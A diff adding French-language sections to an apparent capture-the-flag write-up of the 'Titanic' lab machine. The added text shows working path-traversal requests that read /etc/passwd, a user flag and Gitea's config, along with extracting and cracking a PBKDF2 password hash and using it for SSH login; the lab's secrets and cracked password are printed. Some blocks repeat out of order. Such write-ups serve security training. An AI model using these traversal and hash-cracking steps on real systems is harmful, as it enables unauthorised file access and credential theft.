@@ -470,11 +470,7 @@ Le fichier JSON ne contient que les données du formulaire (nom, email, téléph
 {"name": "noelnac", "email": "noelnac@test.com", "phone": "+32111222333", "date": "2026-05-02", "cabin": "Deluxe"}
 ```
 
-
-
-
-
-
+Pour comprendre comment fonctionne la réservation, tu peux examiner le code source de la page. Cela permet d’identifier l’URL de soumission du formulaire, la méthode HTTP utilisée et les champs transmis au serveur.
 
 ```html
 <form action="/book" method="post">
@@ -491,7 +487,364 @@ Le fichier JSON ne contient que les données du formulaire (nom, email, téléph
 </form>
 ```
 
+L’analyse du formulaire montre que les données sont envoyées vers **`/book`** avec la méthode **POST**, à l’aide des paramètres **`name`**, **`email`**, **`phone`**, **`date`** et **`cabin`**.
 
+À partir de ces éléments, tu peux reconstruire la requête avec `curl`. L’option `-i` permet d’afficher les en-têtes de la réponse HTTP, notamment la redirection vers le téléchargement.
+
+```bash
+curl -i -X POST http://titanic.htb/book \
+  -d "name=noelnac" \
+  -d "email=noelnac@test.com" \
+  -d "phone=+32111222333" \
+  -d "date=2026-05-02" \
+  -d "cabin=Deluxe"
+```
+
+La réponse du serveur est la suivante :
+
+```bash
+HTTP/1.1 302 FOUND
+Date: [date]
+Server: Werkzeug/3.0.3 Python/3.10.12
+Content-Type: text/html; charset=utf-8
+Content-Length: 303
+Location: /download?ticket=c9a902b9-4a78-4b18-8fa9-d2169d144de3.json
+
+<!doctype html>
+<html lang=en>
+<title>Redirecting...</title>
+<h1>Redirecting...</h1>
+<p>You should be redirected automatically to the target URL: <a href="/download?ticket=c9a902b9-4a78-4b18-8fa9-d2169d144de3.json">/download?ticket=c9a902b9-4a78-4b18-8fa9-d2169d144de3.json</a>. If not, click the link.
+```
+
+Le serveur redirige vers l’endpoint **`/download`** avec un paramètre `ticket`, qui correspond au fichier JSON généré.
+
+### Exploitation du paramètre `ticket`
+
+Le paramètre **`ticket`** utilisé dans `/download` indique que le serveur charge un fichier en fonction de ce qui est fourni dans l’URL. Ce comportement peut ouvrir la voie à une **lecture de fichiers locaux (LFI)** si le paramètre n’est pas correctement contrôlé.
+
+Pour le vérifier, tu peux tenter d’accéder à un fichier système classique comme `/etc/passwd` en utilisant une séquence de traversal :
+
+```bash
+curl "http://titanic.htb/download?ticket=../../../../etc/passwd"
+```
+
+La réponse confirme que le contenu du fichier est bien accessible :
+
+```bash
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+pollinate:x:105:1::/var/cache/pollinate:/bin/false
+sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+syslog:x:107:113::/home/syslog:/usr/sbin/nologin
+uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
+tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
+landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
+fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
+usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+developer:x:1000:1000:developer:/home/developer:/bin/bash
+lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
+dnsmasq:x:114:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+_laurel:x:998:998::/var/log/laurel:/bin/false
+```
+
+Le paramètre **`ticket`** est donc vulnérable à une **LFI via path traversal**, permettant de lire des fichiers arbitraires sur le système.
+
+A noter que le fichier `/etc/passwd` révèle notamment la présence d’un utilisateur standard :
+
+```bash
+developer:x:1000:1000:developer:/home/developer:/bin/bash
+```
+
+Cet utilisateur **`developer`** constitue une cible potentielle pour la suite de l’exploitation.
+
+Tu disposes désormais d’une méthode pour récupérer des fichiers sensibles (configuration, clés, identifiants, etc.) via la LFI.
+
+À partir de l’utilisateur identifié, tu peux cibler directement son répertoire personnel. La LFI permet alors de tenter l’accès à des fichiers sensibles, comme le flag utilisateur ou des clés SSH :
+
+```bash
+# flag user.txt
+curl "http://titanic.htb/download?ticket=../../../../home/developer/user.txt"
+# clés SSH
+curl "http://titanic.htb/download?ticket=../../../../home/developer/.ssh/id_rsa"
+curl "http://titanic.htb/download?ticket=../../../../home/developer/.ssh/authorized_keys"
+
+# historique bash
+curl "http://titanic.htb/download?ticket=../../../../home/developer/.bash_history"
+```
+
+Résultats :
+
+```bash
+curl "http://titanic.htb/download?ticket=../../../../home/developer/user.txt"
+f752xxxxxxxxxxxxxxxxxxxxxxxx8ddf
+
+curl "http://titanic.htb/download?ticket=../../../../home/developer/.ssh/id_rsa"
+{"error":"Ticket not found"}
+
+curl "http://titanic.htb/download?ticket=../../../../home/developer/.ssh/authorized_keys"
+
+curl "http://titanic.htb/download?ticket=../../../../home/developer/.bash_history"
+                            
+```
+
+La LFI te permet d’accéder directement au fichier `user.txt` sans obtenir de shell.
+
+Cette méthode te permet de récupérer le flag, mais elle ne te permet pas d’aller plus loin. Sans shell, tu ne peux pas poursuivre vers une élévation de privilèges.
+
+Tu dois donc maintenant chercher à obtenir un accès interactif à la machine.
+
+### Analyse du vhost `dev.titanic.htb`
+
+Après avoir ajouté **`dev.titanic.htb`** dans `/etc/hosts`, tu accèdes à une instance **Gitea 1.22.1**.
+
+![Page d’accueil Gitea sur le vhost dev.titanic.htb révélant un service Git exposé](dev-titanic-htb.png)
+
+La page d’accueil permet d’identifier le service comme étant **Gitea**, en version **1.22.1**.
+
+En explorant les fichiers disponibles, tu récupères notamment un `docker-compose.yml` contenant le volume suivant :
+
+```yaml
+volumes:
+  - /home/developer/gitea/data:/data
+```
+
+Cette configuration indique que le répertoire `/data` utilisé par Gitea dans le conteneur correspond à `/home/developer/gitea/data` sur l’hôte.
+
+Dans Gitea, le fichier de configuration principal est généralement situé dans `/data/gitea/conf/app.ini`, ce qui correspond ici à :
+
+```text
+/home/developer/gitea/data/gitea/conf/app.ini
+```
+
+Grâce à la LFI, tu peux alors récupérer ce fichier :
+
+```bash
+curl "http://titanic.htb/download?ticket=../../../../home/developer/gitea/data/gitea/conf/app.ini"
+```
+
+L’analyse de `app.ini` montre que Gitea utilise une base **SQLite** :
+
+```text
+[database]
+PATH = /data/gitea/gitea.db
+DB_TYPE = sqlite3
+```
+
+Le fichier de base de données se trouve donc dans :
+
+```text
+/home/developer/gitea/data/gitea/gitea.db
+```
+
+Tu peux ensuite le télécharger avec la LFI :
+
+```bash
+curl -o gitea.db \
+  "http://titanic.htb/download?ticket=../../../../home/developer/gitea/data/gitea/gitea.db"
+```
+
+Une fois la base récupérée, tu peux l’analyser localement avec `sqlite3` et extraire les informations de l’utilisateur `developer` :
+
+```bash
+sqlite3 gitea.db "select name,passwd,passwd_hash_algo,salt from user where name='developer';"
+developer|e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56|pbkdf2$50000$50|8bf3e3452b78544f8bee9400d6936d34
+```
+
+Le hash PBKDF2 récupéré depuis la base Gitea peut être cassé hors ligne à l’aide de **Hashcat**.
+
+Le format attendu pour ce type de hash (PBKDF2-HMAC-SHA256) est :
+
+```text
+sha256:iterations:salt:hash
+```
+
+On construit donc le fichier `hash.txt` avec les informations extraites :
+
+```bash
+echo "sha256:50000:8bf3e3452b78544f8bee9400d6936d34:e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56" > hash.txt
+```
+
+On lance ensuite Hashcat avec une wordlist classique :
+
+```bash
+hashcat -m 10900 hash.txt /usr/share/wordlists/rockyou.txt
+```
+
+Une fois l’attaque terminée, le mot de passe peut être affiché avec :
+
+```b
+hashcat -m 10900 hash.txt --show
+sha256:50000:8bf3e3452b78544f8bee9400d6936d34:e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56:25282528
+```
+
+Le mot de passe de l’utilisateur `developer` est donc :
+
+```text
+25282528
+
+```
+
+
+
+
+
+
+
+
+
+Le mot de passe est stocké sous forme de hash **PBKDF2** avec un salt. Un cassage hors ligne permet de retrouver le mot de passe :
+
+```
+25282528
+```
+
+Ce mot de passe permet ensuite d’obtenir un shell via SSH :
+
+```
+ssh developer@titanic.htb
+
+```
+
+
+
+
+
+
+
+```bash
+curl "http://titanic.htb/download?ticket=../../../../home/developer/gitea/data/gitea/conf/app.ini"
+
+APP_NAME = Gitea: Git with a cup of tea
+RUN_MODE = prod
+RUN_USER = git
+WORK_PATH = /data/gitea
+
+[repository]
+ROOT = /data/git/repositories
+
+[repository.local]
+LOCAL_COPY_PATH = /data/gitea/tmp/local-repo
+
+[repository.upload]
+TEMP_PATH = /data/gitea/uploads
+
+[server]
+APP_DATA_PATH = /data/gitea
+DOMAIN = gitea.titanic.htb
+SSH_DOMAIN = gitea.titanic.htb
+HTTP_PORT = 3000
+ROOT_URL = http://gitea.titanic.htb/
+DISABLE_SSH = false
+SSH_PORT = 22
+SSH_LISTEN_PORT = 22
+LFS_START_SERVER = true
+LFS_JWT_SECRET = OqnUg-uJVK-l7rMN1oaR6oTF348gyr0QtkJt-JpjSO4
+OFFLINE_MODE = true
+
+[database]
+PATH = /data/gitea/gitea.db
+DB_TYPE = sqlite3
+HOST = localhost:3306
+NAME = gitea
+USER = root
+PASSWD = 
+LOG_SQL = false
+SCHEMA = 
+SSL_MODE = disable
+
+[indexer]
+ISSUE_INDEXER_PATH = /data/gitea/indexers/issues.bleve
+
+[session]
+PROVIDER_CONFIG = /data/gitea/sessions
+PROVIDER = file
+
+[picture]
+AVATAR_UPLOAD_PATH = /data/gitea/avatars
+REPOSITORY_AVATAR_UPLOAD_PATH = /data/gitea/repo-avatars
+
+[attachment]
+PATH = /data/gitea/attachments
+
+[log]
+MODE = console
+LEVEL = info
+ROOT_PATH = /data/gitea/log
+
+[security]
+INSTALL_LOCK = true
+SECRET_KEY = 
+REVERSE_PROXY_LIMIT = 1
+REVERSE_PROXY_TRUSTED_PROXIES = *
+INTERNAL_TOKEN = eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYmYiOjE3MjI1OTUzMzR9.X4rYDGhkWTZKFfnjgES5r2rFRpu_GXTdQ65456XC0X8
+PASSWORD_HASH_ALGO = pbkdf2
+
+[service]
+DISABLE_REGISTRATION = false
+REQUIRE_SIGNIN_VIEW = false
+REGISTER_EMAIL_CONFIRM = false
+ENABLE_NOTIFY_MAIL = false
+ALLOW_ONLY_EXTERNAL_REGISTRATION = false
+ENABLE_CAPTCHA = false
+DEFAULT_KEEP_EMAIL_PRIVATE = false
+DEFAULT_ALLOW_CREATE_ORGANIZATION = true
+DEFAULT_ENABLE_TIMETRACKING = true
+NO_REPLY_ADDRESS = noreply.localhost
+
+[lfs]
+PATH = /data/git/lfs
+
+[mailer]
+ENABLED = false
+
+[openid]
+ENABLE_OPENID_SIGNIN = true
+ENABLE_OPENID_SIGNUP = true
+
+[cron.update_checker]
+ENABLED = false
+
+[repository.pull-request]
+DEFAULT_MERGE_STYLE = merge
+
+[repository.signing]
+DEFAULT_TRUST_MODEL = committer
+
+[oauth2]
+JWT_SECRET = FIAOKLQX4SBzvZ9eZnHYLTCiVGoBtkE4y5B7vMjzz3g
+
+```
+
+
+
+```bash
+sqlite3 gitea.db "select name,passwd,passwd_hash_algo,salt from user where name='developer';"
+developer|e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56|pbkdf2$50000$50|8bf3e3452b78544f8bee9400d6936d34
+
+```
 
 
 
